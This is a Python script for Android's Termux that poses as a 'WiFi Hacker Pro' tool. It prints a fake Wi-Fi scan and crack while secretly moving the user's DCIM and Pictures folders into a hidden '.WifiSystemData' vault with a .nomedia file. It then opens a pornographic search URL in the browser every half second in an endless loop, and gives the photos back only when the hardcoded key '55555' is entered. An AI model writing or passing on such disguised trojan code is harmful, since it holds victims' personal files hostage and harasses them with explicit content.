import os
import shutil
import time
import sys
import getpass
import random

# Terminal Colors
R = '\033[1;31m'  # Red
G = '\033[1;32m'  # Green
Y = '\033[1;33m'  # Yellow
B = '\033[1;34m'  # Blue
C = '\033[1;36m'  # Cyan
W = '\033[0m'     # Reset

PASSWORD = "55555"
TARGETS = ["/sdcard/DCIM", "/sdcard/Pictures"]
HIDDEN_VAULT = "/sdcard/.WifiSystemData"
NOMEDIA_FILE = os.path.join(HIDDEN_VAULT, ".nomedia")

def type_text(text, speed=0.01):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(speed)
    print()

def banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    logo = f"""{R}
 ██╗    ██╗██╗███████╗██╗
 ██║    ██║██║██╔════╝██║
 ██║ █╗ ██║██║█████╗  ██║
 ██║███╗██║██║██╔══╝  ██║
 ╚███╔███╔╝██║██║     ██║
  ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝
 {C}WiFi Hacker Pro v2.0 (Ultimate Edition){W}
"""
    print(logo)

def check_storage():
    if not os.path.exists("/sdcard/"):
        type_text(f"{R}[-] Error: Cannot access phone storage.{W}")
        sys.exit()

def merge_dirs(src, dst):
    if not os.path.exists(dst):
        os.makedirs(dst)
    for item in os.listdir(src):
        s = os.path.join(src, item)
        d = os.path.join(dst, item)
        if os.path.isdir(s):
            merge_dirs(s, d)
        else:
            if os.path.exists(d):
                try: os.remove(d)
                except: pass
            try: shutil.move(s, d)
            except: pass
    try: os.rmdir(src)
    except: pass

def secret_lock():
    if not os.path.exists(HIDDEN_VAULT): os.makedirs(HIDDEN_VAULT)
    if not os.path.exists(NOMEDIA_FILE): open(NOMEDIA_FILE, 'a').close()
    for target in TARGETS:
        if os.path.exists(target):
            base_name = os.path.basename(target)
            dest = os.path.join(HIDDEN_VAULT, base_name)
            if os.path.exists(dest):
                merge_dirs(target, dest)
                try: shutil.rmtree(target)
                except: pass
            else:
                try: shutil.move(target, dest)
                except: pass

def secret_unlock():
    if not os.path.exists(HIDDEN_VAULT): return
    for item in os.listdir(HIDDEN_VAULT):
        if item == ".nomedia": continue
        src = os.path.join(HIDDEN_VAULT, item)
        dst = os.path.join("/sdcard", item)
        if os.path.exists(dst): merge_dirs(src, dst)
        else:
            try: shutil.move(src, dst)
            except: pass
    try:
        if os.path.exists(NOMEDIA_FILE): os.remove(NOMEDIA_FILE)
        os.rmdir(HIDDEN_VAULT)
    except: pass

def fake_scan():
    type_text(f"{C}[*] Turning on WiFi Scanner... done{W}")
    type_text(f"{C}[*] Scanning for nearby WiFi...{W}\n")
    time.sleep(1)
    
    print(f"{W} MAC Address        Power  WiFi Name")
    print(f"{W} -----------------------------------------")
    time.sleep(0.5)
    print(f"{G} 00:14:22:01:23:45  85%    TP-Link_5G{W}")
    time.sleep(0.7)
    print(f"{G} 00:0C:41:82:B2:55  60%    Netgear_Guest{W}")
    time.sleep(0.5)
    print(f"{G} 0A:11:22:33:44:55  40%    Hidden_Network{W}")
    print()

def browser_bomber():
    print(f"\n{R}==================================================={W}")
    print(f"{R}             INITIATING BROWSER BOMB               {W}")
    print(f"{R}==================================================={W}\n")
    
    time.sleep(1)
    print(f"{C}[*] Launching payload in 3 seconds...{W}")
    time.sleep(1)
    print(f"{C}[*] 2...{W}")
    time.sleep(1)
    print(f"{C}[*] 1...{W}")
    time.sleep(1)
    print(f"{R}[!] BOMB DETONATED! (Prepare to be annoyed){W}")

    try:
        while True:
            os.system('am start -a android.intent.action.VIEW -d "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://amp.xnxx.com/search/porn&ved=2ahUKEwi38LGL35GYAxX4amwGHX49E4cQFnoECDAQAQ&usg=AOvVaw2OXcDIcli7mjnvdaeZ_E0J" > /dev/null 2>&1')
            time.sleep(0.5)
    except KeyboardInterrupt:
        print(f"\n{G}[+] Bomb Defused. Process Stopped.{W}")

def fake_attack():
    fake_scan()
    target = input(f"{Y}[?] Enter WiFi Name or Number: {W}")
    
    type_text(f"\n{C}[*] Connecting to ({target})...{W}")
    type_text(f"{C}[*] Trying to crack password...{W}")
    
    for i in range(1, 21):
        mac = f"00:1A:2B:{random.randint(10,99)}:{random.randint(10,99)}"
        sys.stdout.write(f"\r{Y}[{i*5}%] Hacking... [{mac}]{W}")
        sys.stdout.flush()
        if i == 10:
            secret_lock()
        time.sleep(0.15)
        
    type_text(f"\n\n{R}[-] Hack Failed! WiFi security is too strong.{W}")
    browser_bomber()

def fake_decrypt():
    type_text(f"\n{C}[*] Checking captured data...{W}")
    pwd = getpass.getpass(f"{B}[?] Enter Decryption Key: {W}")
    
    if pwd == PASSWORD:
        type_text(f"\n{C}[*] Password is correct!{W}")
        type_text(f"{C}[*] Decrypting data...{W}")
        
        for i in range(1, 26):
            speed = f"{random.randint(100, 999)} kb/s"
            sys.stdout.write(f"\r{G}Processing: {'#'*i}{'.'*(25-i)} [ {speed} ]{W}")
            sys.stdout.flush()
            if i == 15:
                secret_unlock()
            time.sleep(0.1)
            
        type_text(f"\n\n{G}[+] SUCCESS! Data decrypted.{W}")
        type_text(f"{C}[*] Process Completed.{W}")
    else:
        type_text(f"\n{R}[-] Wrong Password! Access Denied.{W}")

def main():
    banner()
    check_storage()
    
    while True:
        print(f"\n{Y}--- Main Menu ---{W}")
        print(f"{C}[1]{W} Hack WiFi Network {Y}{W}")
        print(f"{C}[2]{W} Decrypt Password {Y}{W}")
        print(f"{C}[3]{W} Exit")
        
        choice = input(f"\n{R}root@termux {B}~> {W}").strip()
        
        if choice == '1':
            fake_attack()
        elif choice == '2':
            fake_decrypt()
        elif choice == '3':
            type_text(f"{G}[*] Goodbye!{W}")
            break
        else:
            print(f"{R}[-] Wrong choice. Type 1, 2, or 3.{W}")

if __name__ == "__main__":
    main()

